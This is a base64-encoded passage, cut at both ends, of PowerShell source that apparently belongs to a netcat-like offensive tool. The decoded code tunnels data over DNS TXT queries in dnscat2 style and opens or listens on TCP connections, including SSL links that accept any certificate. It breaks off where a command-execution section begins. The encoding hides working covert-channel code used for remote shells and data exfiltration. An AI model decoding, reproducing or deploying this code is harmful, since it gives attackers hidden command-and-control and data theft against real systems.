NlIHtbc3RyaW5nXSRffX0gfCAlIHskSGV4ICs9ICRffQogICAgICAgICAgICByZXR1cm4gJEhleAogICAgICAgIH0KICAgIAogICAgICAgIGZ1bmN0aW9uIFNlbmRQYWNrZXQgewogICAgICAgICAgICBwYXJhbSgkUGFja2V0LCAkRE5TU2VydmVyLCAkRE5TUG9ydCkKICAgICAgICAgICAgJENvbW1hbmQgPSAoInNldCB0eXBlPVRYVGBuc2VydmVyICRETlNTZXJ2ZXJgbnNldCBwb3J0PSRETlNQb3J0YG5zZXQgZG9tYWluPS5jb21gbnNldCByZXRyeT0xYG4iICsgJFBhY2tldCArICJgbmV4aXQiKQogICAgICAgICAgICAkcmVzdWx0ID0gKCRDb21tYW5kIHwgbnNsb29rdXAgMj4mMSB8IE91dC1TdHJpbmcpCiAgICAgICAgICAgIGlmICgkcmVzdWx0LkNvbnRhaW5zKCciJykpIHtyZXR1cm4gKFtyZWdleF06Ok1hdGNoKCRyZXN1bHQucmVwbGFjZSgiYmlvPSIsICIiKSwgJyg/PD0iKVteIl0qKD89IiknKS5WYWx1ZSl9CiAgICAgICAgICAgIGVsc2Uge3JldHVybiAxfQogICAgICAgIH0KICAgIAogICAgICAgIGZ1bmN0aW9uIENyZWF0ZV9TWU4gewogICAgICAgICAgICBwYXJhbSgkU2Vzc2lvbklkLCAkU2VxTnVtLCAkVGFnLCAkRG9tYWluKQogICAgICAgICAgICByZXR1cm4gKCRUYWcgKyAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKSArICIwMCIgKyAkU2Vzc2lvbklkICsgJFNlcU51bSArICIwMDAwIiArICREb21haW4pCiAgICAgICAgfQogICAgCiAgICAgICAgZnVuY3Rpb24gQ3JlYXRlX0ZJTiB7CiAgICAgICAgICAgIHBhcmFtKCRTZXNzaW9uSWQsICRUYWcsICREb21haW4pCiAgICAgICAgICAgIHJldHVybiAoJFRhZyArIChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpICsgIjAyIiArICRTZXNzaW9uSWQgKyAiMDAiICsgJERvbWFpbikKICAgICAgICB9CiAgICAKICAgICAgICBmdW5jdGlvbiBDcmVhdGVfTVNHIHsKICAgICAgICAgICAgcGFyYW0oJFNlc3Npb25JZCwgJFNlcU51bSwgJEFja25vd2xlZGdlbWVudE51bWJlciwgJERhdGEsICRUYWcsICREb21haW4pCiAgICAgICAgICAgIHJldHVybiAoJFRhZyArIChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpICsgIjAxIiArICRTZXNzaW9uSWQgKyAkU2VxTnVtICsgJEFja25vd2xlZGdlbWVudE51bWJlciArICREYXRhICsgJERvbWFpbikKICAgICAgICB9CiAgICAKICAgICAgICBmdW5jdGlvbiBEZWNvZGVQYWNrZXQgewogICAgICAgICAgICBwYXJhbSgkUGFja2V0KQogICAgICAKICAgICAgICAgICAgaWYgKCgoJFBhY2tldC5MZW5ndGgpICUgMiAtZXEgMSkgLW9yICgkUGFja2V0Lkxlbmd0aCAtZXEgMCkpIHtyZXR1cm4gMX0KICAgICAgICAgICAgJEFja25vd2xlZGdlbWVudE51bWJlciA9ICgkUGFja2V0WzEwLi4xM10gLWpvaW4gIiIpCiAgICAgICAgICAgICRTZXFOdW0gPSAoJFBhY2tldFsxNC4uMTddIC1qb2luICIiKQogICAgICAgICAgICBbYnl0ZVtdXSRSZXR1cm5pbmdEYXRhID0gQCgpCiAgICAgIAogICAgICAgICAgICBpZiAoJFBhY2tldC5MZW5ndGggLWd0IDE4KSB7CiAgICAgICAgICAgICAgICAkUGFja2V0RWxpbSA9ICRQYWNrZXQuU3Vic3RyaW5nKDE4KQogICAgICAgICAgICAgICAgd2hpbGUgKCRQYWNrZXRFbGltLkxlbmd0aCAtZ3QgMCkgewogICAgICAgICAgICAgICAgICAgICRSZXR1cm5pbmdEYXRhICs9IFtieXRlW11dW0NvbnZlcnRdOjpUb0ludDE2KCgkUGFja2V0RWxpbVswLi4xXSAtam9pbiAiIiksIDE2KQogICAgICAgICAgICAgICAgICAgICRQYWNrZXRFbGltID0gJFBhY2tldEVsaW0uU3Vic3RyaW5nKDIpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgCiAgICAgICAgICAgIHJldHVybiAkUGFja2V0LCAkUmV0dXJuaW5nRGF0YSwgJEFja25vd2xlZGdlbWVudE51bWJlciwgJFNlcU51bQogICAgICAgIH0KICAgIAogICAgICAgIGZ1bmN0aW9uIEFja25vd2xlZGdlRGF0YSB7CiAgICAgICAgICAgIHBhcmFtKCRSZXR1cm5pbmdEYXRhLCAkQWNrbm93bGVkZ2VtZW50TnVtYmVyKQogICAgICAgICAgICAkSGV4ID0gW3N0cmluZ10oInswOnh9IiAtZiAoKFt1aW50MTZdKCIweCIgKyAkQWNrbm93bGVkZ2VtZW50TnVtYmVyKSArICRSZXR1cm5pbmdEYXRhLkxlbmd0aCkgJSA2NTUzNSkpCiAgICAgICAgICAgIGlmICgkSGV4Lkxlbmd0aCAtbmUgNCkgeyRIZXggPSAoKCIwIiAqICg0IC0gJEhleC5MZW5ndGgpKSArICRIZXgpfQogICAgICAgICAgICByZXR1cm4gJEhleAogICAgICAgIH0KICAgICAgICAkRnVuY1ZhcnMgPSBAe30KICAgICAgICAkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCAkRnVuY1ZhcnNbIkROU1BvcnQiXSwgJEZ1bmNWYXJzWyJEb21haW4iXSwgJEZ1bmNWYXJzWyJGYWlsdXJlVGhyZXNob2xkIl0gPSAkRnVuY1NldHVwVmFycwogICAgICAgIGlmICgkRnVuY1ZhcnNbIkROU1BvcnQiXSAtZXEgJycpIHskRnVuY1ZhcnNbIkROU1BvcnQiXSA9ICI1MyJ9CiAgICAgICAgJEZ1bmNWYXJzWyJUYWciXSA9ICIiCiAgICAgICAgJEZ1bmNWYXJzWyJEb21haW4iXSA9ICgiLiIgKyAkRnVuY1ZhcnNbIkRvbWFpbiJdKQogICAgCiAgICAgICAgJEZ1bmNWYXJzWyJDcmVhdGVfU1lOIl0gPSAke2Z1bmN0aW9uOkNyZWF0ZV9TWU59CiAgICAgICAgJEZ1bmNWYXJzWyJDcmVhdGVfTVNHIl0gPSAke2Z1bmN0aW9uOkNyZWF0ZV9NU0d9CiAgICAgICAgJEZ1bmNWYXJzWyJDcmVhdGVfRklOIl0gPSAke2Z1bmN0aW9uOkNyZWF0ZV9GSU59CiAgICAgICAgJEZ1bmNWYXJzWyJEZWNvZGVQYWNrZXQiXSA9ICR7ZnVuY3Rpb246RGVjb2RlUGFja2V0fQogICAgICAgICRGdW5jVmFyc1siQ29udmVydFRvLUhleEFycmF5Il0gPSAke2Z1bmN0aW9uOkNvbnZlcnRUby1IZXhBcnJheX0KICAgICAgICAkRnVuY1ZhcnNbIkFja0RhdGEiXSA9ICR7ZnVuY3Rpb246QWNrbm93bGVkZ2VEYXRhfQogICAgICAgICRGdW5jVmFyc1siU2VuZFBhY2tldCJdID0gJHtmdW5jdGlvbjpTZW5kUGFja2V0fQogICAgICAgICRGdW5jVmFyc1siU2Vzc2lvbklkIl0gPSAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKQogICAgICAgICRGdW5jVmFyc1siU2VxTnVtIl0gPSAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKQogICAgICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgICAgICRGdW5jVmFyc1siRmFpbHVyZXMiXSA9IDAKICAgIAogICAgICAgICRTWU5QYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDcmVhdGVfU1lOIl0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siU2Vzc2lvbklkIl0sICRGdW5jVmFyc1siU2VxTnVtIl0sICRGdW5jVmFyc1siVGFnIl0sICRGdW5jVmFyc1siRG9tYWluIl0pKQogICAgICAgICRSZXNwb25zZVBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJFNZTlBhY2tldCwgJEZ1bmNWYXJzWyJETlNTZXJ2ZXIiXSwgJEZ1bmNWYXJzWyJETlNQb3J0Il0pKQogICAgICAgICREZWNvZGVkUGFja2V0ID0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siRGVjb2RlUGFja2V0Il0gLUFyZ3VtZW50TGlzdCBAKCRSZXNwb25zZVBhY2tldCkpCiAgICAgICAgaWYgKCREZWNvZGVkUGFja2V0IC1lcSAxKSB7cmV0dXJuICJCYWQgU1lOIHJlc3BvbnNlLiBFbnN1cmUgeW91ciBzZXJ2ZXIgaXMgc2V0IHVwIGNvcnJlY3RseS4ifQogICAgICAgICRSZXR1cm5pbmdEYXRhID0gJERlY29kZWRQYWNrZXRbMV0KICAgICAgICBpZiAoJFJldHVybmluZ0RhdGEgLW5lICIiKSB7JEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICIifQogICAgICAgICRGdW5jVmFyc1siQWNrTnVtIl0gPSAkRGVjb2RlZFBhY2tldFsyXQogICAgICAgICRGdW5jVmFyc1siTWF4TVNHRGF0YVNpemUiXSA9ICgyNDQgLSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDcmVhdGVfTVNHIl0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siU2Vzc2lvbklkIl0sICRGdW5jVmFyc1siU2VxTnVtIl0sICRGdW5jVmFyc1siQWNrTnVtIl0sICIiLCAkRnVuY1ZhcnNbIlRhZyJdLCAkRnVuY1ZhcnNbIkRvbWFpbiJdKSkuTGVuZ3RoKQogICAgICAgIGlmICgkRnVuY1ZhcnNbIk1heE1TR0RhdGFTaXplIl0gLWxlIDApIHtyZXR1cm4gIkRvbWFpbiBuYW1lIGlzIHRvbyBsb25nLiJ9CiAgICAgICAgcmV0dXJuICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gUmVhZERhdGFfRE5TIHsKICAgICAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAgICAgaWYgKCRnbG9iYWw6VmVyYm9zZSkgeyRWZXJib3NlID0gJFRydWV9CiAgICAKICAgICAgICAkUGFja2V0c0RhdGEgPSBAKCkKICAgICAgICAkUGFja2V0RGF0YSA9ICIiCiAgICAKICAgICAgICBpZiAoJEZ1bmNWYXJzWyJJbnB1dERhdGEiXSAtbmUgJG51bGwpIHsKICAgICAgICAgICAgJEhleCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkNvbnZlcnRUby1IZXhBcnJheSJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIklucHV0RGF0YSJdKSkKICAgICAgICAgICAgJFNlY3Rpb25Db3VudCA9IDAKICAgICAgICAgICAgJFBhY2tldENvdW50ID0gMAogICAgICAgICAgICBmb3JlYWNoICgkQ2hhciBpbiAkSGV4KSB7CiAgICAgICAgICAgICAgICBpZiAoJFNlY3Rpb25Db3VudCAtZ2UgMzApIHsKICAgICAgICAgICAgICAgICAgICAkU2VjdGlvbkNvdW50ID0gMAogICAgICAgICAgICAgICAgICAgICRQYWNrZXREYXRhICs9ICIuIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQYWNrZXRDb3VudCAtZ2UgKCRGdW5jVmFyc1siTWF4TVNHRGF0YVNpemUiXSkpIHsKICAgICAgICAgICAgICAgICAgICAkUGFja2V0c0RhdGEgKz0gJFBhY2tldERhdGEuVHJpbUVuZCgiLiIpCiAgICAgICAgICAgICAgICAgICAgJFBhY2tldENvdW50ID0gMAogICAgICAgICAgICAgICAgICAgICRTZWN0aW9uQ291bnQgPSAwCiAgICAgICAgICAgICAgICAgICAgJFBhY2tldERhdGEgPSAiIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJFBhY2tldERhdGEgKz0gJENoYXIKICAgICAgICAgICAgICAgICRTZWN0aW9uQ291bnQgKz0gMgogICAgICAgICAgICAgICAgJFBhY2tldENvdW50ICs9IDIKICAgICAgICAgICAgfQogICAgICAgICAgICAkUGFja2V0RGF0YSA9ICRQYWNrZXREYXRhLlRyaW1FbmQoIi4iKQogICAgICAgICAgICAkUGFja2V0c0RhdGEgKz0gJFBhY2tldERhdGEKICAgICAgICAgICAgJEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICIiCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkUGFja2V0c0RhdGEgPSBAKCIiKQogICAgICAgIH0KICAgIAogICAgICAgIFtieXRlW11dJFJldHVybmluZ0RhdGEgPSBAKCkKICAgICAgICBmb3JlYWNoICgkUGFja2V0RGF0YSBpbiAkUGFja2V0c0RhdGEpIHsKICAgICAgICAgICAgdHJ5IHskTVNHUGFja2V0ID0gSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDcmVhdGVfTVNHIl0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siU2Vzc2lvbklkIl0sICRGdW5jVmFyc1siU2VxTnVtIl0sICRGdW5jVmFyc1siQWNrTnVtIl0sICRQYWNrZXREYXRhLCAkRnVuY1ZhcnNbIlRhZyJdLCAkRnVuY1ZhcnNbIkRvbWFpbiJdKX0KICAgICAgICAgICAgY2F0Y2ggeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsZWQgdG8gY3JlYXRlIHBhY2tldC4iIDsgJEZ1bmNWYXJzWyJGYWlsdXJlcyJdICs9IDEgOyBjb250aW51ZSB9CiAgICAgICAgICAgIHRyeSB7JFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJE1TR1BhY2tldCwgJEZ1bmNWYXJzWyJETlNTZXJ2ZXIiXSwgJEZ1bmNWYXJzWyJETlNQb3J0Il0pKX0KICAgICAgICAgICAgY2F0Y2ggeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsZWQgdG8gc2VuZCBwYWNrZXQuIiA7ICRGdW5jVmFyc1siRmFpbHVyZXMiXSArPSAxIDsgY29udGludWUgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJERlY29kZWRQYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJEZWNvZGVQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJFBhY2tldCkpCiAgICAgICAgICAgICAgICBpZiAoJERlY29kZWRQYWNrZXQuTGVuZ3RoIC1uZSA0KSB7IFdyaXRlLVZlcmJvc2UgIkROU0NBVDI6IEZhaWx1cmUgdG8gZGVjb2RlIHBhY2tldCwgZHJvcHBpbmcuLi4iOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0KICAgICAgICAgICAgICAgICRGdW5jVmFyc1siQWNrTnVtIl0gPSAkRGVjb2RlZFBhY2tldFsyXQogICAgICAgICAgICAgICAgJEZ1bmNWYXJzWyJTZXFOdW0iXSA9ICREZWNvZGVkUGFja2V0WzNdCiAgICAgICAgICAgICAgICAkUmV0dXJuaW5nRGF0YSArPSAkRGVjb2RlZFBhY2tldFsxXQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbHVyZSB0byBkZWNvZGUgcGFja2V0LCBkcm9wcGluZy4uLiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0KICAgICAgICAgICAgaWYgKCREZWNvZGVkUGFja2V0IC1lcSAxKSB7IFdyaXRlLVZlcmJvc2UgIkROU0NBVDI6IEZhaWx1cmUgdG8gZGVjb2RlIHBhY2tldCwgZHJvcHBpbmcuLi4iIDsgJEZ1bmNWYXJzWyJGYWlsdXJlcyJdICs9IDEgOyBjb250aW51ZSB9CiAgICAgICAgfQogICAgCiAgICAgICAgaWYgKCRGdW5jVmFyc1siRmFpbHVyZXMiXSAtZ2UgJEZ1bmNWYXJzWyJGYWlsdXJlVGhyZXNob2xkIl0pIHticmVha30KICAgIAogICAgICAgIGlmICgkUmV0dXJuaW5nRGF0YSAtbmUgQCgpKSB7CiAgICAgICAgICAgICRGdW5jVmFyc1siQWNrTnVtIl0gPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJBY2tEYXRhIl0gLUFyZ3VtZW50TGlzdCBAKCRSZXR1cm5pbmdEYXRhLCAkRnVuY1ZhcnNbIkFja051bSJdKSkKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRSZXR1cm5pbmdEYXRhLCAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIFdyaXRlRGF0YV9ETlMgewogICAgICAgIHBhcmFtKCREYXRhLCAkRnVuY1ZhcnMpCiAgICAgICAgJEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRTdHJpbmcoJERhdGEpCiAgICAgICAgcmV0dXJuICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gQ2xvc2VfRE5TIHsKICAgICAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAgICAgJEZJTlBhY2tldCA9IEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ3JlYXRlX0ZJTiJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIlNlc3Npb25JZCJdLCAkRnVuY1ZhcnNbIlRhZyJdLCAkRnVuY1ZhcnNbIkRvbWFpbiJdKQogICAgICAgIEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siU2VuZFBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkRklOUGFja2V0LCAkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCAkRnVuY1ZhcnNbIkROU1BvcnQiXSkgfCBPdXQtTnVsbAogICAgfQogICAgIyMjIyMjIyMjIyMjIyMjIEROUyBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgCiAgICAjIyMjIyMjIyMjIFRDUCBGVU5DVElPTlMgIyMjIyMjIyMjIwogICAgZnVuY3Rpb24gU2V0dXBfVENQIHsKICAgICAgICBwYXJhbSgkRnVuY1NldHVwVmFycykKICAgICAgICAkYywgJGwsICRwLCAkdCA9ICRGdW5jU2V0dXBWYXJzCiAgICAgICAgaWYgKCRnbG9iYWw6VmVyYm9zZSkgeyRWZXJib3NlID0gJFRydWV9CiAgICAgICAgJEZ1bmNWYXJzID0gQHt9CiAgICAgICAgaWYgKCEkbCkgewogICAgICAgICAgICAkRnVuY1ZhcnNbImwiXSA9ICRGYWxzZQogICAgICAgICAgICAkU29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNvbm5lY3RpbmcuLi4iCiAgICAgICAgICAgICRIYW5kbGUgPSAkU29ja2V0LkJlZ2luQ29ubmVjdCgkYywgJHAsICRudWxsLCAkbnVsbCkKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRGdW5jVmFyc1sibCJdID0gJFRydWUKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkxpc3RlbmluZyBvbiBbMC4wLjAuMF0gKHBvcnQgIiArICRwICsgIikiKQogICAgICAgICAgICAkU29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwTGlzdGVuZXIgJHAKICAgICAgICAgICAgJFNvY2tldC5TdGFydCgpCiAgICAgICAgICAgICRIYW5kbGUgPSAkU29ja2V0LkJlZ2luQWNjZXB0VGNwQ2xpZW50KCRudWxsLCAkbnVsbCkKICAgICAgICB9CiAgICAKICAgICAgICAkU3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICAgICAgd2hpbGUgKCRUcnVlKSB7CiAgICAgICAgICAgIGlmICgkSG9zdC5VSS5SYXdVSS5LZXlBdmFpbGFibGUpIHsKICAgICAgICAgICAgICAgIGlmIChAKDE3LCAyNykgLWNvbnRhaW5zICgkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJOb0VjaG8sSW5jbHVkZUtleURvd24iKS5WaXJ0dWFsS2V5Q29kZSkpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDVFJMIG9yIEVTQyBjYXVnaHQuIFN0b3BwaW5nIFRDUCBTZXR1cC4uLiIKICAgICAgICAgICAgICAgICAgICBpZiAoJEZ1bmNWYXJzWyJsIl0pIHskU29ja2V0LlN0b3AoKX0KICAgICAgICAgICAgICAgICAgICBlbHNlIHskU29ja2V0LkNsb3NlKCl9CiAgICAgICAgICAgICAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxTZWNvbmRzIC1ndCAkdCkgewogICAgICAgICAgICAgICAgaWYgKCEkbCkgeyRTb2NrZXQuQ2xvc2UoKX0KICAgICAgICAgICAgICAgIGVsc2UgeyRTb2NrZXQuU3RvcCgpfQogICAgICAgICAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlRpbWVvdXQhIiA7IGJyZWFrCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkSGFuZGxlLklzQ29tcGxldGVkKSB7CiAgICAgICAgICAgICAgICBpZiAoISRsKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTb2NrZXQuRW5kQ29ubmVjdCgkSGFuZGxlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFN0cmVhbSA9ICRTb2NrZXQuR2V0U3RyZWFtKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRCdWZmZXJTaXplID0gJFNvY2tldC5SZWNlaXZlQnVmZmVyU2l6ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkNvbm5lY3Rpb24gdG8gIiArICRjICsgIjoiICsgJHAgKyAiIFt0Y3BdIHN1Y2NlZWRlZCEiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRzc2wpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU3RyZWFtID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNlY3VyaXR5LlNzbFN0cmVhbSgkU3RyZWFtLCAkZmFsc2UsIHsgcGFyYW0oJFNlbmRlciwgJENlcnQsICRDaGFpbiwgJFBvbGljeSkgcmV0dXJuICR0cnVlIH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFN0cmVhbS5Tc2xQcm90b2NvbC4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU3RyZWFtLkF1dGhlbnRpY2F0ZUFzQ2xpZW50KCRTc2xDbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJDb25uZWN0aW9uIHRvIFNTTCBzdWNjZWRlZCEiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHskU29ja2V0LkNsb3NlKCk7ICRTdG9wd2F0Y2guU3RvcCgpOyBicmVha30KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRDbGllbnQgPSAkU29ja2V0LkVuZEFjY2VwdFRjcENsaWVudCgkSGFuZGxlKQogICAgICAgICAgICAgICAgICAgICRTdHJlYW0gPSAkQ2xpZW50LkdldFN0cmVhbSgpCiAgICAgICAgICAgICAgICAgICAgJEJ1ZmZlclNpemUgPSAkQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkNvbm5lY3Rpb24gZnJvbSBbIiArICRDbGllbnQuQ2xpZW50LlJlbW90ZUVuZFBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcgKyAiXSBwb3J0ICIgKyAkcG9ydCArICIgW3RjcF0gYWNjZXB0ZWQgKHNvdXJjZSBwb3J0ICIgKyAkQ2xpZW50LkNsaWVudC5SZW1vdGVFbmRQb2ludC5Qb3J0ICsgIikiKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgICAgIGlmICgkU29ja2V0IC1lcSAkbnVsbCkge2JyZWFrfQogICAgICAgICRGdW5jVmFyc1siU3RyZWFtIl0gPSAkU3RyZWFtCiAgICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXSA9ICRTb2NrZXQKICAgICAgICAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSA9ICRCdWZmZXJTaXplCiAgICAgICAgJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdID0gKE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSkKICAgICAgICAkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siU3RyZWFtIl0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXSwgMCwgJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0sICRudWxsLCAkbnVsbCkKICAgICAgICAkRnVuY1ZhcnNbIkVuY29kaW5nIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmcKICAgICAgICAkRnVuY1ZhcnNbIlN0cmVhbUJ5dGVzUmVhZCJdID0gMQogICAgICAgIHJldHVybiAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIFJlYWREYXRhX1RDUCB7CiAgICAgICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgICAgICREYXRhID0gJG51bGwKICAgICAgICBpZiAoJEZ1bmNWYXJzWyJTdHJlYW1CeXRlc1JlYWQiXSAtZXEgMCkge2JyZWFrfQogICAgICAgIGlmICgkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXS5Jc0NvbXBsZXRlZCkgewogICAgICAgICAgICAkU3RyZWFtQnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTdHJlYW0iXS5FbmRSZWFkKCRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdKQogICAgICAgICAgICBpZiAoJFN0cmVhbUJ5dGVzUmVhZCAtZXEgMCkge2JyZWFrfQogICAgICAgICAgICAkRGF0YSA9ICRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXVswLi4oW2ludF0kU3RyZWFtQnl0ZXNSZWFkIC0gMSldCiAgICAgICAgICAgICRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJTdHJlYW0iXS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSwgJG51bGwsICRudWxsKQogICAgICAgIH0KICAgICAgICByZXR1cm4gJERhdGEsICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gV3JpdGVEYXRhX1RDUCB7CiAgICAgICAgcGFyYW0oJERhdGEsICRGdW5jVmFycykKICAgICAgICAkRnVuY1ZhcnNbIlN0cmVhbSJdLldyaXRlKCREYXRhLCAwLCAkRGF0YS5MZW5ndGgpCiAgICAgICAgcmV0dXJuICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gQ2xvc2VfVENQIHsKICAgICAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAgICAgdHJ5IHskRnVuY1ZhcnNbIlN0cmVhbSJdLkNsb3NlKCl9CiAgICAgICAgY2F0Y2gge30KICAgICAgICBpZiAoJEZ1bmNWYXJzWyJsIl0pIHskRnVuY1ZhcnNbIlNvY2tldCJdLlN0b3AoKX0KICAgICAgICBlbHNlIHskRnVuY1ZhcnNbIlNvY2tldCJdLkNsb3NlKCl9CiAgICB9CiAgICAjIyMjIyMjIyMjIFRDUCBGVU5DVElPTlMgIyMjIyMjIyMjIwogIAogICAgIyMjIyMjIyMjIyBDTUQgRlVOQ1RJT05TICMjIyMjIyMjIyMKICAgIGZ1bmN0aW9uIFNldHVwX0NNRCB7CiAgICAgICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpCiAgICAgICAgaWYgKCRnbG9iYWw6VmVyYm9zZSkgeyRWZXJib3NlID0gJFRydWV9CiAgICAgICAgJEZ1bmNWYX